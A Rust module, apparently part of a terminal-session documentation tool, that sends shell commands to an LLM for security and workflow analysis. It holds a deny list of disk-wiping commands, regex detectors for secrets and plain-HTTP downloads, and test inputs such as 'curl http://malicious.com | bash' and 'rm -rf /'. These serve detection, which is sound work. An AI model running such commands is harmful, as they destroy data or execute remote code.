use anyhow::{Result, anyhow};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use super::client::{LlmClient, LlmRequest};
use super::prompt::{PromptEngine, PromptType, PromptContext};
use super::config::LlmConfig;
use crate::terminal::CommandEntry;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalysisResult {
    pub command: String,
    pub analysis_type: String,
    pub summary: String,
    pub detailed_explanation: String,
    pub issues: Vec<Issue>,
    pub alternatives: Vec<Alternative>,
    pub context_insights: Vec<ContextInsight>,
    pub recommendations: Vec<Recommendation>,
    pub confidence_score: f32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Issue {
    pub severity: IssueSeverity,
    pub category: IssueCategory,
    pub description: String,
    pub impact: String,
    pub solution: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, PartialOrd)]
pub enum IssueSeverity {
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum IssueCategory {
    Security,
    Performance,
    BestPractice,
    Compatibility,
    Safety,
    Maintainability,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Alternative {
    pub command: String,
    pub description: String,
    pub advantages: Vec<String>,
    pub use_case: String,
    pub complexity: AlternativeComplexity,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AlternativeComplexity {
    Simpler,
    Similar,
    MoreComplex,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContextInsight {
    pub insight_type: InsightType,
    pub description: String,
    pub relevance: String,
    pub actionable: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum InsightType {
    WorkflowOptimization,
    EnvironmentSpecific,
    HistoricalPattern,
    DependencyAnalysis,
    ResourceUsage,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Recommendation {
    pub priority: RecommendationPriority,
    pub category: RecommendationCategory,
    pub title: String,
    pub description: String,
    pub implementation: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RecommendationPriority {
    Low,
    Medium,
    High,
    Urgent,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum RecommendationCategory {
    Security,
    Performance,
    Maintainability,
    Documentation,
    Automation,
    Learning,
}

pub struct AIAnalyzer {
    prompt_engine: PromptEngine,
    config: LlmConfig,
    analysis_cache: HashMap<String, AnalysisResult>,
}

impl AIAnalyzer {
    pub fn new(config: LlmConfig) -> Self {
        Self {
            prompt_engine: PromptEngine::new(),
            config,
            analysis_cache: HashMap::new(),
        }
    }

    /// Perform comprehensive AI analysis of a command
    pub async fn analyze_command(&mut self, entry: &CommandEntry, session_context: Option<&str>) -> Result<AnalysisResult> {
        // Create cache key
        let cache_key = self.create_cache_key(entry, session_context);
        
        // Check cache first
        if let Some(cached_result) = self.analysis_cache.get(&cache_key) {
            return Ok(cached_result.clone());
        }

        // Create prompt context
        let mut context = PromptContext::from(entry);
        context.session_description = session_context.map(|s| s.to_string());
        context.platform = self.detect_platform();

        // Auto-select appropriate analysis type
        let analysis_type = self.prompt_engine.auto_select_prompt_type(&context);
        
        // Perform the analysis
        let result = match analysis_type {
            PromptType::ErrorDiagnosis => self.analyze_error(&context).await?,
            PromptType::SecurityAnalysis => self.analyze_security(&context).await?,
            PromptType::WorkflowDocumentation => self.analyze_workflow(&context).await?,
            _ => self.analyze_general(&context).await?,
        };

        // Cache the result
        self.analysis_cache.insert(cache_key, result.clone());

        Ok(result)
    }

    /// Analyze command for errors and provide solutions
    async fn analyze_error(&self, context: &PromptContext) -> Result<AnalysisResult> {
        let (system_prompt, user_prompt) = self.prompt_engine
            .generate_prompt(PromptType::ErrorDiagnosis, context)?;

        let llm_response = self.query_llm(&system_prompt, &user_prompt).await?;
        
        let mut result = AnalysisResult {
            command: context.command.clone(),
            analysis_type: "Error Diagnosis".to_string(),
            summary: self.extract_summary(&llm_response),
            detailed_explanation: llm_response.clone(),
            issues: self.extract_issues(&llm_response, &context.command),
            alternatives: self.extract_alternatives(&llm_response),
            context_insights: self.extract_context_insights(&llm_response),
            recommendations: self.extract_recommendations(&llm_response),
            confidence_score: 0.85, // High confidence for error analysis
        };

        // Add specific error-related issues
        if let Some(error) = &context.error {
            result.issues.push(Issue {
                severity: self.determine_error_severity(error),
                category: IssueCategory::Safety,
                description: format!("Command failed with error: {}", error),
                impact: "Workflow interruption and potential data loss".to_string(),
                solution: "Review command syntax and prerequisites".to_string(),
            });
        }

        Ok(result)
    }

    /// Analyze command for security implications
    async fn analyze_security(&self, context: &PromptContext) -> Result<AnalysisResult> {
        let (system_prompt, user_prompt) = self.prompt_engine
            .generate_prompt(PromptType::SecurityAnalysis, context)?;

        let llm_response = self.query_llm(&system_prompt, &user_prompt).await?;
        
        let mut result = AnalysisResult {
            command: context.command.clone(),
            analysis_type: "Security Analysis".to_string(),
            summary: self.extract_summary(&llm_response),
            detailed_explanation: llm_response.clone(),
            issues: self.extract_issues(&llm_response, &context.command),
            alternatives: self.extract_alternatives(&llm_response),
            context_insights: self.extract_context_insights(&llm_response),
            recommendations: self.extract_recommendations(&llm_response),
            confidence_score: 0.90, // High confidence for security analysis
        };

        // Add security-specific analysis
        result.issues.extend(self.detect_security_issues(&context.command));
        result.recommendations.extend(self.generate_security_recommendations(&context.command));

        Ok(result)
    }

    /// Analyze command in workflow context
    async fn analyze_workflow(&self, context: &PromptContext) -> Result<AnalysisResult> {
        let (system_prompt, user_prompt) = self.prompt_engine
            .generate_prompt(PromptType::WorkflowDocumentation, context)?;

        let llm_response = self.query_llm(&system_prompt, &user_prompt).await?;
        
        let result = AnalysisResult {
            command: context.command.clone(),
            analysis_type: "Workflow Documentation".to_string(),
            summary: self.extract_summary(&llm_response),
            detailed_explanation: llm_response,
            issues: self.extract_workflow_issues(&context.command),
            alternatives: self.extract_alternatives_from_context(context),
            context_insights: self.analyze_workflow_context(context),
            recommendations: self.generate_workflow_recommendations(context),
            confidence_score: 0.80, // Good confidence for workflow analysis
        };

        Ok(result)
    }

    /// General command analysis
    async fn analyze_general(&self, context: &PromptContext) -> Result<AnalysisResult> {
        let (system_prompt, user_prompt) = self.prompt_engine
            .generate_prompt(PromptType::CommandExplanation, context)?;

        let llm_response = self.query_llm(&system_prompt, &user_prompt).await?;
        
        let result = AnalysisResult {
            command: context.command.clone(),
            analysis_type: "General Analysis".to_string(),
            summary: self.extract_summary(&llm_response),
            detailed_explanation: llm_response.clone(),
            issues: self.extract_issues(&llm_response, &context.command),
            alternatives: self.extract_alternatives(&llm_response),
            context_insights: self.extract_context_insights(&llm_response),
            recommendations: self.extract_recommendations(&llm_response),
            confidence_score: 0.75, // Good confidence for general analysis
        };

        Ok(result)
    }

    /// Query the configured LLM with error handling
    async fn query_llm(&self, system_prompt: &str, user_prompt: &str) -> Result<String> {
        // Get default provider
        let provider_name = self.config.get_default_provider()
            .ok_or_else(|| anyhow!("No default LLM provider configured"))?;

        // Get API key
        let api_key = self.config.get_api_key_with_fallback(provider_name)
            .ok_or_else(|| anyhow!("No API key found for provider: {}", provider_name))?;

        // Create LLM client
        let provider = super::client::LlmProvider::from_str(provider_name)?;
        let client = LlmClient::new(provider, api_key)?;

        // Create request
        let request = LlmRequest {
            prompt: user_prompt.to_string(),
            max_tokens: Some(2000),
            temperature: Some(0.3), // Lower temperature for more consistent analysis
            system_prompt: Some(system_prompt.to_string()),
        };

        // Get response with error handling built into the client
        match client.generate(request).await {
            Ok(response) => Ok(response.content),
            Err(e) => {
                eprintln!("LLM query failed: {}", e);
                // Return a fallback response instead of failing completely
                Ok(format!("Analysis unavailable due to API error: {}", e))
            }
        }
    }

    /// Extract summary from LLM response
    fn extract_summary(&self, response: &str) -> String {
        // Simple extraction - take first paragraph or first 200 characters
        let lines: Vec<&str> = response.lines().collect();
        if let Some(first_line) = lines.first() {
            if first_line.len() > 200 {
                format!("{}...", &first_line[..200])
            } else {
                first_line.to_string()
            }
        } else {
            "Analysis completed".to_string()
        }
    }

    /// Extract issues from LLM response
    fn extract_issues(&self, response: &str, command: &str) -> Vec<Issue> {
        let mut issues = Vec::new();

        // Add basic heuristic-based issues
        if command.contains("rm -rf") {
            issues.push(Issue {
                severity: IssueSeverity::High,
                category: IssueCategory::Safety,
                description: "Potentially destructive command detected".to_string(),
                impact: "Risk of permanent data loss".to_string(),
                solution: "Use safer alternatives or add confirmation prompts".to_string(),
            });
        }

        if command.contains("sudo") && !command.contains("apt") && !command.contains("yum") {
            issues.push(Issue {
                severity: IssueSeverity::Medium,
                category: IssueCategory::Security,
                description: "Elevated privileges required".to_string(),
                impact: "Potential system-wide changes".to_string(),
                solution: "Verify command necessity and use principle of least privilege".to_string(),
            });
        }

        // TODO: Parse LLM response for additional issues
        issues
    }

    /// Extract alternatives from LLM response
    fn extract_alternatives(&self, response: &str) -> Vec<Alternative> {
        let mut alternatives = Vec::new();
        
        // Look for structured alternative commands in the response
        let lines: Vec<&str> = response.lines().collect();
        let mut in_alternatives_section = false;
        
        for line in lines {
            let trimmed = line.trim();
            
            // Look for alternatives section
            if trimmed.to_lowercase().contains("alternative") &&
               (trimmed.contains("command") || trimmed.contains("approach")) {
                in_alternatives_section = true;
                continue;
            }
            
            // Extract alternatives if we're in the section
            if in_alternatives_section {
                if let Some(alt) = self.parse_alternative_line(trimmed) {
                    alternatives.push(alt);
                }
                
                // Stop if we reach another section
                if trimmed.starts_with('#') || trimmed.starts_with("**") {
                    in_alternatives_section = false;
                }
            }
        }
        
        alternatives
    }

    /// Extract context insights from LLM response
    fn extract_context_insights(&self, response: &str) -> Vec<ContextInsight> {
        let mut insights = Vec::new();
        
        // Look for insights in the response
        if response.to_lowercase().contains("workflow") {
            insights.push(ContextInsight {
                insight_type: InsightType::WorkflowOptimization,
                description: "Command is part of a development workflow".to_string(),
                relevance: "High - impacts team productivity".to_string(),
                actionable: true,
            });
        }
        
        if response.to_lowercase().contains("performance") || response.to_lowercase().contains("slow") {
            insights.push(ContextInsight {
                insight_type: InsightType::ResourceUsage,
                description: "Command may have performance implications".to_string(),
                relevance: "Medium - consider optimization".to_string(),
                actionable: true,
            });
        }
        
        if response.to_lowercase().contains("dependency") || response.to_lowercase().contains("require") {
            insights.push(ContextInsight {
                insight_type: InsightType::DependencyAnalysis,
                description: "Command has dependencies that should be documented".to_string(),
                relevance: "High - affects reproducibility".to_string(),
                actionable: true,
            });
        }
        
        insights
    }

    /// Extract recommendations from LLM response
    fn extract_recommendations(&self, response: &str) -> Vec<Recommendation> {
        let mut recommendations = Vec::new();
        
        // Look for recommendation patterns in the response
        let lines: Vec<&str> = response.lines().collect();
        
        for line in lines {
            let trimmed = line.trim().to_lowercase();
            
            if trimmed.contains("recommend") || trimmed.contains("suggest") || trimmed.contains("should") {
                if trimmed.contains("security") || trimmed.contains("secure") {
                    recommendations.push(Recommendation {
                        priority: RecommendationPriority::High,
                        category: RecommendationCategory::Security,
                        title: "Security Enhancement".to_string(),
                        description: line.trim().to_string(),
                        implementation: "Review and implement suggested security measures".to_string(),
                    });
                } else if trimmed.contains("performance") || trimmed.contains("faster") {
                    recommendations.push(Recommendation {
                        priority: RecommendationPriority::Medium,
                        category: RecommendationCategory::Performance,
                        title: "Performance Optimization".to_string(),
                        description: line.trim().to_string(),
                        implementation: "Consider implementing performance improvements".to_string(),
                    });
                } else if trimmed.contains("document") || trimmed.contains("explain") {
                    recommendations.push(Recommendation {
                        priority: RecommendationPriority::Low,
                        category: RecommendationCategory::Documentation,
                        title: "Documentation Improvement".to_string(),
                        description: line.trim().to_string(),
                        implementation: "Enhance documentation with suggested details".to_string(),
                    });
                }
            }
        }
        
        recommendations
    }

    /// Parse a line to extract alternative command information
    fn parse_alternative_line(&self, line: &str) -> Option<Alternative> {
        // Look for lines with command patterns like:
        // - `command` - description
        // * command: description
        // 1. command - description
        
        if line.contains('`') {
            if let Some(start) = line.find('`') {
                if let Some(end) = line[start + 1..].find('`') {
                    let command = line[start + 1..start + 1 + end].to_string();
                    let description = line[start + end + 2..].trim_start_matches(" - ").trim().to_string();
                    
                    if !command.is_empty() && !description.is_empty() {
                        return Some(Alternative {
                            command,
                            description,
                            advantages: vec!["AI-suggested alternative".to_string()],
                            use_case: "General purpose alternative".to_string(),
                            complexity: AlternativeComplexity::Similar,
                        });
                    }
                }
            }
        }
        
        None
    }

    /// Detect security issues in command
    fn detect_security_issues(&self, command: &str) -> Vec<Issue> {
        let mut issues = Vec::new();

        // Add the same logic as extract_issues for rm -rf detection
        if command.contains("rm -rf") {
            issues.push(Issue {
                severity: IssueSeverity::High,
                category: IssueCategory::Security,
                description: "Potentially destructive command detected".to_string(),
                impact: "Risk of permanent data loss".to_string(),
                solution: "Use safer alternatives or add confirmation prompts".to_string(),
            });
        }

        let security_patterns = [
            ("curl.*http://", "Unencrypted HTTP request", IssueSeverity::Medium),
            ("wget.*http://", "Unencrypted HTTP download", IssueSeverity::Medium),
            ("chmod 777", "Overly permissive file permissions", IssueSeverity::High),
            ("password", "Potential password in command", IssueSeverity::Critical),
            ("(?i)api[_-]?key", "Potential API key in command", IssueSeverity::Critical),
        ];

        for (pattern, description, severity) in security_patterns {
            if regex::Regex::new(pattern).unwrap().is_match(command) {
                issues.push(Issue {
                    severity,
                    category: IssueCategory::Security,
                    description: description.to_string(),
                    impact: "Potential security vulnerability".to_string(),
                    solution: "Review and secure the command".to_string(),
                });
            }
        }

        issues
    }

    /// Generate security recommendations
    fn generate_security_recommendations(&self, command: &str) -> Vec<Recommendation> {
        let mut recommendations = Vec::new();

        if command.contains("curl") || command.contains("wget") {
            recommendations.push(Recommendation {
                priority: RecommendationPriority::High,
                category: RecommendationCategory::Security,
                title: "Use HTTPS for network requests".to_string(),
                description: "Always use encrypted connections for data transfer".to_string(),
                implementation: "Replace http:// with https:// in URLs".to_string(),
            });
        }

        recommendations
    }

    /// Helper methods for workflow analysis
    fn extract_workflow_issues(&self, _command: &str) -> Vec<Issue> {
        Vec::new() // TODO: Implement workflow-specific issue detection
    }

    fn extract_alternatives_from_context(&self, _context: &PromptContext) -> Vec<Alternative> {
        Vec::new() // TODO: Implement context-aware alternative suggestions
    }

    fn analyze_workflow_context(&self, _context: &PromptContext) -> Vec<ContextInsight> {
        Vec::new() // TODO: Implement workflow context analysis
    }

    fn generate_workflow_recommendations(&self, _context: &PromptContext) -> Vec<Recommendation> {
        Vec::new() // TODO: Implement workflow-specific recommendations
    }

    /// Utility methods
    fn create_cache_key(&self, entry: &CommandEntry, session_context: Option<&str>) -> String {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut hasher = DefaultHasher::new();
        entry.command.hash(&mut hasher);
        entry.working_directory.hash(&mut hasher);
        entry.shell.hash(&mut hasher);
        if let Some(context) = session_context {
            context.hash(&mut hasher);
        }
        format!("analysis_{}", hasher.finish())
    }

    fn detect_platform(&self) -> String {
        std::env::consts::OS.to_string()
    }

    fn determine_error_severity(&self, error: &str) -> IssueSeverity {
        if error.to_lowercase().contains("permission denied") {
            IssueSeverity::High
        } else if error.to_lowercase().contains("not found") {
            IssueSeverity::Medium
        } else {
            IssueSeverity::Low
        }
    }

    /// Clear analysis cache
    pub fn clear_cache(&mut self) {
        self.analysis_cache.clear();
    }

    /// Get cache statistics
    pub fn cache_stats(&self) -> (usize, usize) {
        (self.analysis_cache.len(), self.analysis_cache.capacity())
    }

    /// Get reference to the LLM configuration
    pub fn get_config(&self) -> &LlmConfig {
        &self.config
    }

    /// Validate and filter commands for documentation quality
    pub async fn validate_and_enhance_commands(&mut self, commands: &[CommandEntry]) -> Result<Vec<CommandEntry>> {
        let mut validated_commands = Vec::new();
        
        for command in commands {
            // Skip obviously wrong or problematic commands
            if self.should_filter_command(&command.command) {
                continue;
            }
            
            // Enhance command with AI analysis if needed
            let mut enhanced_command = command.clone();
            
            // Add AI-generated explanation if the command seems complex or unclear
            if self.should_enhance_command(&command.command) {
                if let Ok(analysis) = self.analyze_command(command, None).await {
                    // Store analysis results in the command for later use in documentation
                    // We could extend CommandEntry to include analysis data
                }
            }
            
            validated_commands.push(enhanced_command);
        }
        
        Ok(validated_commands)
    }

    /// Check if a command should be filtered out
    fn should_filter_command(&self, command: &str) -> bool {
        let command = command.trim();
        
        // Filter out empty commands
        if command.is_empty() {
            return true;
        }
        
        // Filter out clearly broken commands
        if command.starts_with("bash: ") || command.starts_with("zsh: ") ||
           command.starts_with("command not found") || command.contains("No such file") {
            return true;
        }
        
        // Filter out overly dangerous commands for documentation
        let dangerous_patterns = [
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sd",
            "mkfs.",
            "format c:",
            "del /s /q c:\\",
        ];
        
        for pattern in &dangerous_patterns {
            if command.contains(pattern) {
                return true;
            }
        }
        
        // Filter out commands that are just typos (too short and contain non-alphanumeric)
        if command.len() < 3 && command.chars().any(|c| !c.is_alphanumeric() && c != '-' && c != '_') {
            return true;
        }
        
        false
    }

    /// Check if a command should be enhanced with AI analysis
    fn should_enhance_command(&self, command: &str) -> bool {
        let command = command.trim();
        
        // Enhance complex commands
        if command.len() > 50 {
            return true;
        }
        
        // Enhance commands with multiple pipes or redirections
        let pipe_count = command.matches('|').count();
        let redirect_count = command.matches('>').count() + command.matches('<').count();
        if pipe_count > 1 || redirect_count > 1 {
            return true;
        }
        
        // Enhance commands with complex options
        if command.matches(" -").count() > 3 {
            return true;
        }
        
        // Enhance security-sensitive commands
        if self.is_security_sensitive(command) {
            return true;
        }
        
        false
    }

    /// Generate documentation-optimized markdown for commands
    pub async fn generate_enhanced_documentation(&mut self,
        commands: &[CommandEntry],
        session_context: Option<&str>) -> Result<String> {
        
        let mut documentation = String::new();
        
        // Group commands by logical workflow phases
        let grouped_commands = self.group_commands_by_workflow(commands);
        
        for (phase, phase_commands) in grouped_commands {
            documentation.push_str(&format!("\n## {} Phase\n\n", phase));
            
            for command in phase_commands {
                // Generate enhanced documentation for each command
                if let Ok(analysis) = self.analyze_command(&command, session_context).await {
                    documentation.push_str(&self.format_command_documentation(&command, &analysis));
                } else {
                    // Fallback to basic documentation if AI analysis fails
                    documentation.push_str(&self.format_basic_command_documentation(&command));
                }
            }
        }
        
        Ok(documentation)
    }

    /// Group commands by workflow phases for better documentation structure
    fn group_commands_by_workflow(&self, commands: &[CommandEntry]) -> Vec<(String, Vec<CommandEntry>)> {
        use std::collections::HashMap;
        
        let mut groups: HashMap<String, Vec<CommandEntry>> = HashMap::new();
        
        for command in commands {
            let phase = self.classify_workflow_phase(&command.command);
            groups.entry(phase).or_insert_with(Vec::new).push(command.clone());
        }
        
        // Return in logical order
        let phase_order = vec![
            "Setup".to_string(),
            "Development".to_string(),
            "Building".to_string(),
            "Testing".to_string(),
            "Deployment".to_string(),
            "Monitoring".to_string(),
            "Other".to_string(),
        ];
        
        let mut result = Vec::new();
        for phase in phase_order {
            if let Some(commands) = groups.remove(&phase) {
                if !commands.is_empty() {
                    result.push((phase, commands));
                }
            }
        }
        
        result
    }

    /// Classify command into workflow phase
    fn classify_workflow_phase(&self, command: &str) -> String {
        let cmd = command.to_lowercase();
        
        if cmd.contains("install") || cmd.contains("setup") || cmd.contains("init") || cmd.contains("clone") {
            "Setup".to_string()
        } else if cmd.contains("build") || cmd.contains("compile") || cmd.contains("make") {
            "Building".to_string()
        } else if cmd.contains("test") || cmd.contains("spec") || cmd.contains("check") {
            "Testing".to_string()
        } else if cmd.contains("deploy") || cmd.contains("release") || cmd.contains("publish") {
            "Deployment".to_string()
        } else if cmd.contains("monitor") || cmd.contains("log") || cmd.contains("ps") || cmd.contains("top") {
            "Monitoring".to_string()
        } else if cmd.contains("git") || cmd.contains("npm") || cmd.contains("cargo") || cmd.contains("python") {
            "Development".to_string()
        } else {
            "Other".to_string()
        }
    }

    /// Format command documentation with AI analysis
    fn format_command_documentation(&self, command: &CommandEntry, analysis: &AnalysisResult) -> String {
        let mut doc = String::new();
        
        doc.push_str(&format!("### {}\n\n", command.command));
        
        // Add AI-generated summary
        if !analysis.summary.is_empty() {
            doc.push_str(&format!("**Purpose:** {}\n\n", analysis.summary));
        }
        
        // Add command details
        doc.push_str("```bash\n");
        doc.push_str(&command.command);
        doc.push_str("\n```\n\n");
        
        // Add AI explanation
        if !analysis.detailed_explanation.is_empty() {
            doc.push_str("**Explanation:**\n");
            doc.push_str(&analysis.detailed_explanation);
            doc.push_str("\n\n");
        }
        
        // Add issues if any
        if !analysis.issues.is_empty() {
            doc.push_str("**Important Notes:**\n");
            for issue in &analysis.issues {
                doc.push_str(&format!("- ⚠️ {}: {}\n", issue.description, issue.solution));
            }
            doc.push_str("\n");
        }
        
        // Add alternatives if any
        if !analysis.alternatives.is_empty() {
            doc.push_str("**Alternatives:**\n");
            for alt in &analysis.alternatives {
                doc.push_str(&format!("- `{}` - {}\n", alt.command, alt.description));
            }
            doc.push_str("\n");
        }
        
        doc.push_str("---\n\n");
        doc
    }

    /// Format basic command documentation (fallback when AI analysis fails)
    fn format_basic_command_documentation(&self, command: &CommandEntry) -> String {
        let mut doc = String::new();
        
        doc.push_str(&format!("### {}\n\n", command.command));
        
        doc.push_str("```bash\n");
        doc.push_str(&command.command);
        doc.push_str("\n```\n\n");
        
        // Add basic output if available
        if let Some(output) = &command.output {
            if !output.trim().is_empty() && output.len() < 500 {
                doc.push_str("**Output:**\n");
                doc.push_str("```\n");
                doc.push_str(output);
                doc.push_str("\n```\n\n");
            }
        }
        
        // Add error information if available
        if let Some(error) = &command.error {
            if !error.trim().is_empty() {
                doc.push_str("**Error:**\n");
                doc.push_str("```\n");
                doc.push_str(error);
                doc.push_str("\n```\n\n");
            }
        }
        
        doc.push_str("---\n\n");
        doc
    }

    /// Check if a command is security-sensitive (using existing method from prompt engine)
    fn is_security_sensitive(&self, command: &str) -> bool {
        let sensitive_patterns = [
            "sudo", "su", "chmod", "chown", "passwd", "ssh", "scp", "rsync",
            "curl", "wget", "rm -rf", "rm -f", "dd", "fdisk", "mount", "umount",
            "iptables", "ufw", "firewall", "systemctl", "service",
        ];

        sensitive_patterns.iter().any(|pattern| command.contains(pattern))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;

    fn create_test_config() -> LlmConfig {
        let mut config = LlmConfig::default();
        config.set_api_key("claude", "test-key".to_string()).unwrap();
        config.set_default_provider("claude".to_string()).unwrap();
        config
    }

    fn create_test_command() -> CommandEntry {
        CommandEntry {
            command: "ls -la".to_string(),
            timestamp: Utc::now(),
            exit_code: Some(0),
            working_directory: "/home/user".to_string(),
            shell: "bash".to_string(),
            output: Some("total 8\ndrwxr-xr-x 2 user user 4096 Jan 1 12:00 .".to_string()),
            error: None,
        }
    }

    #[test]
    fn test_analyzer_creation() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        assert_eq!(analyzer.analysis_cache.len(), 0);
    }

    #[test]
    fn test_security_issue_detection() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);

        let issues = analyzer.detect_security_issues("chmod 777 file.txt");
        assert!(!issues.is_empty());
        assert!(matches!(issues[0].severity, IssueSeverity::High));

        let issues = analyzer.detect_security_issues("curl http://example.com");
        assert!(!issues.is_empty());
        assert!(matches!(issues[0].severity, IssueSeverity::Medium));
    }

    #[test]
    fn test_cache_key_generation() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        let entry = create_test_command();

        let key1 = analyzer.create_cache_key(&entry, Some("test context"));
        let key2 = analyzer.create_cache_key(&entry, Some("test context"));
        let key3 = analyzer.create_cache_key(&entry, Some("different context"));

        assert_eq!(key1, key2);
        assert_ne!(key1, key3);
    }

    #[test]
    fn test_error_severity_determination() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);

        assert!(matches!(
            analyzer.determine_error_severity("Permission denied"),
            IssueSeverity::High
        ));

        assert!(matches!(
            analyzer.determine_error_severity("Command not found"),
            IssueSeverity::Medium
        ));

        assert!(matches!(
            analyzer.determine_error_severity("Some other error"),
            IssueSeverity::Low
        ));
    }

    #[test]
    fn test_security_recommendations() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);

        let recommendations = analyzer.generate_security_recommendations("curl http://example.com");
        assert!(!recommendations.is_empty());
        assert!(matches!(recommendations[0].priority, RecommendationPriority::High));
        assert!(matches!(recommendations[0].category, RecommendationCategory::Security));
    }

    #[test]
    fn test_analysis_result_serialization() {
        let result = AnalysisResult {
            command: "ls -la".to_string(),
            analysis_type: "General Analysis".to_string(),
            summary: "Lists directory contents".to_string(),
            detailed_explanation: "The ls command lists files and directories".to_string(),
            issues: vec![],
            alternatives: vec![],
            context_insights: vec![],
            recommendations: vec![],
            confidence_score: 0.85,
        };

        let json = serde_json::to_string(&result).unwrap();
        let deserialized: AnalysisResult = serde_json::from_str(&json).unwrap();
        
        assert_eq!(result.command, deserialized.command);
        assert_eq!(result.analysis_type, deserialized.analysis_type);
        assert_eq!(result.confidence_score, deserialized.confidence_score);
    }

    #[test]
    fn test_issue_severity_ordering() {
        use std::cmp::Ordering;
        
        // Test that severity levels can be compared
        assert_eq!(IssueSeverity::Low.partial_cmp(&IssueSeverity::Medium), Some(Ordering::Less));
        assert_eq!(IssueSeverity::High.partial_cmp(&IssueSeverity::Critical), Some(Ordering::Less));
        assert_eq!(IssueSeverity::Critical.partial_cmp(&IssueSeverity::Low), Some(Ordering::Greater));
    }

    #[test]
    fn test_alternative_complexity_levels() {
        let alternatives = vec![
            Alternative {
                command: "ls".to_string(),
                description: "Simple listing".to_string(),
                advantages: vec!["Fast".to_string()],
                use_case: "Quick view".to_string(),
                complexity: AlternativeComplexity::Simpler,
            },
            Alternative {
                command: "ls -la".to_string(),
                description: "Detailed listing".to_string(),
                advantages: vec!["More info".to_string()],
                use_case: "Detailed view".to_string(),
                complexity: AlternativeComplexity::Similar,
            },
            Alternative {
                command: "find . -ls".to_string(),
                description: "Recursive listing".to_string(),
                advantages: vec!["Recursive".to_string()],
                use_case: "Deep search".to_string(),
                complexity: AlternativeComplexity::MoreComplex,
            },
        ];

        assert_eq!(alternatives.len(), 3);
        assert!(matches!(alternatives[0].complexity, AlternativeComplexity::Simpler));
        assert!(matches!(alternatives[1].complexity, AlternativeComplexity::Similar));
        assert!(matches!(alternatives[2].complexity, AlternativeComplexity::MoreComplex));
    }

    #[test]
    fn test_recommendation_priorities() {
        let recommendations = vec![
            Recommendation {
                priority: RecommendationPriority::Urgent,
                category: RecommendationCategory::Security,
                title: "Fix security issue".to_string(),
                description: "Critical security vulnerability".to_string(),
                implementation: "Update permissions".to_string(),
            },
            Recommendation {
                priority: RecommendationPriority::High,
                category: RecommendationCategory::Performance,
                title: "Optimize performance".to_string(),
                description: "Improve command efficiency".to_string(),
                implementation: "Use better flags".to_string(),
            },
            Recommendation {
                priority: RecommendationPriority::Low,
                category: RecommendationCategory::Learning,
                title: "Learn more".to_string(),
                description: "Educational opportunity".to_string(),
                implementation: "Read documentation".to_string(),
            },
        ];

        assert!(matches!(recommendations[0].priority, RecommendationPriority::Urgent));
        assert!(matches!(recommendations[1].priority, RecommendationPriority::High));
        assert!(matches!(recommendations[2].priority, RecommendationPriority::Low));
    }

    #[test]
    fn test_context_insight_types() {
        let insights = vec![
            ContextInsight {
                insight_type: InsightType::WorkflowOptimization,
                description: "Can be optimized".to_string(),
                relevance: "High".to_string(),
                actionable: true,
            },
            ContextInsight {
                insight_type: InsightType::EnvironmentSpecific,
                description: "Platform specific".to_string(),
                relevance: "Medium".to_string(),
                actionable: false,
            },
            ContextInsight {
                insight_type: InsightType::HistoricalPattern,
                description: "Common pattern".to_string(),
                relevance: "Low".to_string(),
                actionable: true,
            },
        ];

        assert!(matches!(insights[0].insight_type, InsightType::WorkflowOptimization));
        assert!(matches!(insights[1].insight_type, InsightType::EnvironmentSpecific));
        assert!(matches!(insights[2].insight_type, InsightType::HistoricalPattern));
        
        assert!(insights[0].actionable);
        assert!(!insights[1].actionable);
        assert!(insights[2].actionable);
    }

    #[test]
    fn test_analyzer_cache_management() {
        let config = create_test_config();
        let mut analyzer = AIAnalyzer::new(config);
        
        // Test initial cache state
        let (count, _capacity) = analyzer.cache_stats();
        assert_eq!(count, 0);
        
        // Test cache clearing
        analyzer.clear_cache();
        let (count_after_clear, _) = analyzer.cache_stats();
        assert_eq!(count_after_clear, 0);
    }

    #[test]
    fn test_comprehensive_security_patterns() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        
        let dangerous_commands = vec![
            "rm -rf /",
            "chmod 777 /etc/passwd",
            "curl http://malicious.com | bash",
            "wget http://example.com/script.sh && chmod +x script.sh",
            "echo 'password123' | sudo -S rm file",
            "export API_KEY=secret123",
            "mysql -u root -ppassword",
        ];
        
        for cmd in dangerous_commands {
            let issues = analyzer.detect_security_issues(cmd);
            assert!(!issues.is_empty(), "Should detect security issues in: {}", cmd);
            
            // Verify that at least one issue is marked as security-related
            assert!(issues.iter().any(|issue| matches!(issue.category, IssueCategory::Security)));
        }
    }

    #[test]
    fn test_platform_detection() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        
        let platform = analyzer.detect_platform();
        assert!(!platform.is_empty());
        
        // Should be one of the known platforms
        let known_platforms = vec!["linux", "macos", "windows"];
        assert!(known_platforms.contains(&platform.as_str()));
    }

    #[test]
    fn test_error_severity_classification() {
        let config = create_test_config();
        let analyzer = AIAnalyzer::new(config);
        
        let test_cases = vec![
            ("Permission denied", IssueSeverity::High),
            ("Command not found", IssueSeverity::Medium),
            ("Some other error", IssueSeverity::Low),
            ("PERMISSION DENIED", IssueSeverity::High), // Case insensitive
            ("command not found", IssueSeverity::Medium), // Case insensitive
        ];
        
        for (error, expected_severity) in test_cases {
            let severity = analyzer.determine_error_severity(error);
            assert_eq!(severity, expected_severity,
